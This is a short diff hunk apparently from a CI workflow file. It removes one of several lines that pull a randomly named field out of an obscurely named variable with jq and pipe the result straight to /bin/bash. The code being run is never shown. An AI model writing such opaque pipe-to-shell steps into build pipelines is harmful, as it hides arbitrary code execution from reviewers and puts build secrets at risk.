@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$p60" | jq -r .buah787 | /bin/bash
           echo $pqaze1087 | jq -r .lpyu8896 | /bin/bash
           printf '%s' "$jxa72976" | jq -r .srt7 | /bin/bash
-          echo $g3049 | jq -r .qxyfs719 | /bin/bash
           printf '%s' "$wbqe20" | jq -r .faycl154 | /bin/bash
           echo $tsqeq468 | jq -r .hvhbg41154 | /bin/bash
           echo $alpo47802 | jq -r .urqn735 | /bin/bash
